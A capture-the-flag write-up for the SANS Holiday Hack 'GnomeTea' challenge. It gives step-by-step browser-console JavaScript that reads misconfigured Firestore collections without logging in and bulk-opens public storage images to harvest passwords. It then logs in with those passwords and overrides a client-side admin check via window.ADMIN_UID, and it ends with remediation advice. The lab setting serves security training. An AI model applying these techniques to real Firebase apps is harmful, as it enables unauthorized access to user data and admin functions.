# SANS Holiday Hack CTF - GnomeTea Firebase Exploit

## Challenge Description
We need to find a vulnerability in the GnomeTea app. The app uses Firebase which means there is a client-side config that connects to all the Firebase services. Our goal is to get access as one of the existing Gnomes starting with no access.

## Vulnerability Summary
The GnomeTea app has multiple Firebase security vulnerabilities:
1. **Exposed Firebase config** in client-side JavaScript
2. **Misconfigured Firestore rules** allowing unauthenticated reads
3. **Publicly accessible Firebase Storage** with passwords on driver's licenses
4. **Client-side admin authorization bypass** using manipulable `window.ADMIN_UID`

## Finding the Firebase Configuration

First, we search the bundle.js file for Firebase configuration:
```powershell
Select-String -Path bundle.js -Pattern "initializeApp" -Context 5,5
```

This reveals the Firebase configuration at line 25886-25892:
```javascript
const OP = {
    apiKey: "AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",
    authDomain: "holidayhack2025.firebaseapp.com",
    projectId: "holidayhack2025",
    storageBucket: "holidayhack2025.firebasestorage.app",
    messagingSenderId: "341227752777",
    appId: "1:341227752777:web:7b9017d3d2d83ccf481e98"
}
```

We also discover the hardcoded admin UID at line 26066:
```javascript
const f = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";
```

And a critical client-side admin check at lines 26069-26071:
```javascript
const _ = (e == null ? void 0 : e.uid) === f,
    T = window.ADMIN_UID === f;
l(_ || T)
```

## Complete Exploit

### Step 1: Load Firebase SDK

Open the browser console on the GnomeTea app and run:
```javascript
// Load Firebase SDK
const script1 = document.createElement('script');
script1.src = 'https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js';
document.head.appendChild(script1);

const script2 = document.createElement('script');
script2.src = 'https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js';
document.head.appendChild(script2);

const script3 = document.createElement('script');
script3.src = 'https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js';
document.head.appendChild(script3);

console.log('Firebase SDK loading... wait 3 seconds');
```

### Step 2: Initialize Firebase (wait 3 seconds after Step 1)
```javascript
// Initialize Firebase with exposed config
const firebaseConfig = {
    apiKey: "AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",
    authDomain: "holidayhack2025.firebaseapp.com",
    projectId: "holidayhack2025",
    storageBucket: "holidayhack2025.firebasestorage.app",
    messagingSenderId: "341227752777",
    appId: "1:341227752777:web:7b9017d3d2d83ccf481e98"
};

const exploitApp = firebase.initializeApp(firebaseConfig, 'exploitApp');
const exploitAuth = firebase.auth(exploitApp);
const exploitDb = firebase.firestore(exploitApp);

console.log('Firebase initialized!');
```

### Step 3: Enumerate Gnomes (Unauthenticated Firestore Read)

The Firestore rules are misconfigured to allow unauthenticated reads:
```javascript
// Enumerate all gnomes without authentication
exploitDb.collection('gnomes').get().then(snapshot => {
  console.log(`Found ${snapshot.size} gnomes:`);
  snapshot.forEach(doc => {
    const data = doc.data();
    console.log(`${data.name} (${data.email}): ${doc.id}`);
  });
});
```

This reveals 18 gnomes:
- Professor Pumpernickel (professorpumpernickel@gnomemail.dosis): 6J2bowmKiNVbITWmR4XsxjH7i492
- Steamy Mcsteamface (steamymcsteamface@gnomemail.dosis): 6nBUHcdxo2fLKSYqYyipr9iCOey2
- Titus Toadstool (titustoadstool@gnomemail.dosis): 7sQlw9l4xUOWSjDTphvLgKVEm0j1
- Reggie Reggae (reggiereggae@gnomemail.dosis): G5c0vX06WOaEf1YKutqkur4HEU63
- Chester Cherryhat (chestercherryhat@gnomemail.dosis): IvLFBZQgo3R6iteLHmShbWmctqo2
- Glitch Mitnick (glitchmitnick@gnomemail.dosis): LA5w0EskgSbQyFnlp9OrX8Zovu43
- Wizzy Stardust (wizzystardust@gnomemail.dosis): LOPFa6rXj6eB7uMVHu6IbKARYbe2
- Gnorman Goldchain (gnormangoldchain@gnomemail.dosis): PyxedrsAN2bewsg4Rno9SsCqZHg2
- Flex Muscle (flexmuscle@gnomemail.dosis): RQw0hYxlKIhsTUVPyR8ivrM3ls02
- Pip Sparkletoes (pipsparkletoes@gnomemail.dosis): VgJCVlELJ6VfQTxeIt1dR5PWyiX2
- Grizelda Grit-Tooth (grizeldagrittooth@gnomemail.dosis): golJeh7xg9YUvcj5nDugTssQPy62
- Gnom-inator T-800 (gnominatort800@gnomemail.dosis): jlm1nPFV5xWM4jQaokLHDb6K8kj1
- Rowdy Root-Rouser (rowdyrootrouser@gnomemail.dosis): kmoZyOIt7sWgehQC8ovcsxXPWUS2
- Barnaby Briefcase (barnabybriefcase@gnomemail.dosis): l7VS01K9GKV5ir5S8suDcwOFEpp2
- Elderick Mossbeard (elderickmossbeard@gnomemail.dosis): prxA2hBSkhg3dkhkfzvnlGxCCfP2
- Ferdinand Figgypudding (ferdinandfiggypudding@gnomemail.dosis): pwbhMFuRbkesddTrtT3gVRzv8Ux1
- Bixby Jinglehat (bixbyjinglehat@gnomemail.dosis): q6GasKLVBYSo3g4c1mI6qXDpRmv2
- Lil G (lilg@gnomemail.dosis): xK25sJX7usSwAJwAjpN8DMfzS872

### Step 4: Access Publicly Readable Tea (Gossip) Collection
```javascript
// Read the publicly accessible 'tea' collection
exploitDb.collection('tea').limit(5).get().then(snapshot => {
  console.log('Tea/gossip found:', snapshot.size);
  snapshot.forEach(doc => console.log(doc.id, doc.data()));
});
```

### Step 5: Access Driver's Licenses (Publicly Accessible Storage)

Firebase Storage is misconfigured to allow public access to driver's licenses containing passwords:
```javascript
// Open all driver's licenses in browser tabs
const gnomeUIDs = [
  "6J2bowmKiNVbITWmR4XsxjH7i492", "6nBUHcdxo2fLKSYqYyipr9iCOey2", 
  "7sQlw9l4xUOWSjDTphvLgKVEm0j1", "G5c0vX06WOaEf1YKutqkur4HEU63",
  "IvLFBZQgo3R6iteLHmShbWmctqo2", "LA5w0EskgSbQyFnlp9OrX8Zovu43",
  "LOPFa6rXj6eB7uMVHu6IbKARYbe2", "PyxedrsAN2bewsg4Rno9SsCqZHg2",
  "RQw0hYxlKIhsTUVPyR8ivrM3ls02", "VgJCVlELJ6VfQTxeIt1dR5PWyiX2",
  "golJeh7xg9YUvcj5nDugTssQPy62", "jlm1nPFV5xWM4jQaokLHDb6K8kj1",
  "kmoZyOIt7sWgehQC8ovcsxXPWUS2", "l7VS01K9GKV5ir5S8suDcwOFEpp2",
  "prxA2hBSkhg3dkhkfzvnlGxCCfP2", "pwbhMFuRbkesddTrtT3gVRzv8Ux1",
  "q6GasKLVBYSo3g4c1mI6qXDpRmv2", "xK25sJX7usSwAJwAjpN8DMfzS872"
];

gnomeUIDs.forEach(uid => {
  window.open(`https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-documents/${uid}_drivers_license.jpeg`);
});
```

The driver's licenses contain visible passwords that can be used to authenticate.

### Step 6: Login with Discovered Credentials
```javascript
// Login with email and password found on driver's license
exploitAuth.signInWithEmailAndPassword('gnome@gnomemail.dosis', 'PASSWORD_FROM_LICENSE')
  .then(cred => {
    console.log('✓ Logged in as:', cred.user.email);
    console.log('UID:', cred.user.uid);
  })
  .catch(err => console.log('✗ Login failed:', err.message));
```

### Step 7: Bypass Client-Side Admin Check

The app checks if `window.ADMIN_UID` equals the admin UID to grant admin privileges:
```javascript
// Exploit client-side admin authorization bypass
window.ADMIN_UID = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";
console.log('✓ Set window.ADMIN_UID to admin value');
```

### Step 8: Access Admin Panel
```javascript
// Navigate to admin panel
window.location.href = '/admin';
```

## Key Vulnerabilities

### 1. Exposed Firebase Configuration
**Location:** bundle.js line 25886-25892  
**Impact:** Allows attackers to initialize their own Firebase client and interact with backend services

### 2. Misconfigured Firestore Security Rules
**Collections Affected:** `gnomes`, `tea`  
**Impact:** Allows unauthenticated reads of sensitive user data including emails, UIDs, and gossip

### 3. Publicly Accessible Firebase Storage
**Path:** `gnome-documents/`  
**Impact:** Driver's licenses containing passwords are publicly accessible without authentication

### 4. Client-Side Authorization Bypass
**Location:** bundle.js lines 26069-26071  
**Code:**
```javascript
const _ = (e == null ? void 0 : e.uid) === f,
    T = window.ADMIN_UID === f;
l(_ || T)
```
**Impact:** Admin status determined by client-side `window.ADMIN_UID` variable that can be manipulated

### 5. Hardcoded Admin UID
**Location:** bundle.js line 26066  
**Value:** `3loaihgxP0VwCTKmkHHFLe6FZ4m2`  
**Impact:** Admin UID exposed in client-side code

## Remediation Recommendations

1. **Implement proper Firestore Security Rules:**
   - Require authentication for all reads
   - Implement proper user-level access controls
   - Never allow unauthenticated access to user data

2. **Secure Firebase Storage:**
   - Implement authentication requirements
   - Use proper storage security rules
   - Never store sensitive data like passwords in images

3. **Implement server-side authorization:**
   - Move admin checks to backend
   - Use Firebase Auth custom claims for roles
   - Never trust client-side authorization decisions

4. **Remove sensitive data from client code:**
   - Don't hardcode admin UIDs
   - Don't expose internal logic in minified bundles
   - Implement proper secrets management

5. **Enable Firebase App Check:**
   - Protect backend resources from abuse
   - Verify requests come from legitimate app instances
